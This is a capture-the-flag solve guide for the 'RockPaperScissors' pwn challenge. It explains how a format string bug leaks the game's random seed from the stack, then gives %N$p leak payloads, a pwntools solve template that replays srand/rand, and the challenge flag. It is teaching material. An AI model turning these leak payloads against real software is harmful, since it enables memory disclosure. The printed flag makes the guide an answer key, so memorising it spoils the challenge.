# Solve.md

# [Medium] Pwn - RockPaperScissors - Solve Guide

## Overview

This challenge provides a Rock Paper Scissors game where the player must beat the computer 100 times in a row.

At first, this appears to rely on predicting random choices. However, analysis of the binary shows that the program uses a seed value from the environment. If this seed can be recovered, the computer's future choices can be predicted.

The vulnerability that makes this possible is a format string bug.

## Initial Analysis

Start by inspecting the binary:

file rps
checksec --file=./rps
strings ./rps

During analysis, it becomes clear that the program expects an environment variable named:
```
SEED
```
If this variable is not set, the binary will not behave correctly.

Run the binary locally with a known seed:
```
SEED=1234 ./rps
```
This allows local testing and makes it easier to compare behaviour against the remote or Docker version.

## Game Logic

The computer's moves are generated from a pseudo-random sequence derived from the seed.

If the seed is known, the next moves can be reproduced locally.

The objective is therefore:

1. Recover the seed used by the remote instance.
2. Recreate the same pseudo-random sequence locally.
3. Submit the winning move for each round.
4. Repeat until 100 consecutive wins are reached.

## Vulnerability

When the program taunts the user for being bad at Rock Paper Scissors, it performs a `printf()` directly on a user-controlled variable.

This creates a format string vulnerability.

Instead of safely printing user input like this:
```
printf("%s", user_input);
```
the program effectively does something like:
```
printf(user_input);
```
This allows the player to use format specifiers such as:

%p
%x
$s

to inspect stack values.

## Exploitation Strategy

The seed value is present on the stack.

Using the format string vulnerability, we can climb the stack and leak values until the seed is found.

The rough process is:

1. Run the binary locally with a known seed.
2. Trigger the taunt / vulnerable feedback path.
3. Use format string payloads to inspect stack positions.
4. Find the stack offset where the seed appears.
5. Confirm that the stack position is stable.
6. Use the same stack offset against the challenge container or remote instance.
7. Leak the real seed.
8. Use that seed to generate the next 100 computer choices.
9. Send the winning response each round.

## Finding the Stack Offset

Run the binary locally with a known seed:

SEED=1234 ./rps

Then trigger the vulnerable input and test stack positions.

Example payloads:
```
%1$p
%2$p
%3$p
%4$p
%5$p
```
You can automate this by sending a payload like:
```
%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p.%9$p.%10$p
```
Keep increasing the range until the known seed value appears.

Once the seed is found, note the stack position.

For example, if the seed appears at position 12, the leak payload may be:
```
%12$p
```
The exact offset depends on the compiled binary, but the intended solution relies on the local offset matching the Docker environment.

## Predicting the Computer

After leaking the seed, initialise the same random number generator locally.

The program likely maps random values to Rock, Paper, or Scissors.

For example:
```
0 = rock
1 = paper
2 = scissors
```
To win:

rock beats scissors
paper beats rock
scissors beats paper

So the winning response mapping is:

computer rock     -> play paper
computer paper    -> play scissors
computer scissors -> play rock

## Example Solve Script Structure

The exact prompts and offsets should be adjusted to match the final binary.
```python
from pwn import *
import ctypes

HOST = "127.0.0.1"
PORT = 1337

# Replace this with the discovered stack offset.
SEED_OFFSET = 0

libc = ctypes.CDLL("libc.so.6")

def winning_move(computer_move):
    if computer_move == 0:
        return b"paper"
    if computer_move == 1:
        return b"scissors"
    if computer_move == 2:
        return b"rock"
    raise ValueError("invalid move")

def leak_seed(io):
    payload = f"%{SEED_OFFSET}$p".encode()

    # Navigate to the vulnerable input path.
    # Update these prompts to match the binary.
    io.sendlineafter(b">", b"rock")
    io.sendlineafter(b"name:", payload)

    leak = io.recvuntil(b"\n")
    leaked_value = int(leak.strip().split()[-1], 16)

    return leaked_value

def main():
    io = remote(HOST, PORT)

    seed = leak_seed(io)
    log.success(f"Leaked seed: {seed}")

    libc.srand(seed)

    for _ in range(100):
        computer = libc.rand() % 3
        move = winning_move(computer)

        io.sendlineafter(b">", move)

    io.interactive()

if __name__ == "__main__":
    main()
```
## Important Notes

The exploit script above is a template. The final version needs to match:

- The actual menu prompts
- The discovered stack offset
- The exact random number function used
- The exact mapping between random values and game choices

The key idea is that once the seed is leaked, the game is no longer random.

## Exploit Flow

1. Inspect the binary and discover that it requires the `SEED` environment variable.
2. Run the binary locally using a known seed.
3. Trigger the taunt message.
4. Identify the format string vulnerability.
5. Use format specifiers to leak stack values.
6. Find the position of the seed on the stack.
7. Confirm the offset locally.
8. Use the same offset in the Docker or remote instance.
9. Recover the real seed.
10. Recreate the pseudo-random sequence.
11. Send the correct winning move 100 times.
12. Receive the flag.

## Key Finding

The challenge is not solved by guessing the Rock Paper Scissors outcomes manually.

The intended route is to exploit a format string vulnerability to leak the random seed, then use that seed to predict every future computer move.

## Flag
```
P2P{Y0u_4r3_b3773r_47_7h15_7h4n_3xp3c73d}
```
## Lessons Learned

This challenge combines two important exploitation ideas:

1. Predictable pseudo-random number generation.
2. Format string vulnerabilities.

The important takeaway is that randomness is only secure if the seed remains secret and unpredictable. Once the seed is leaked, every future output can be reproduced.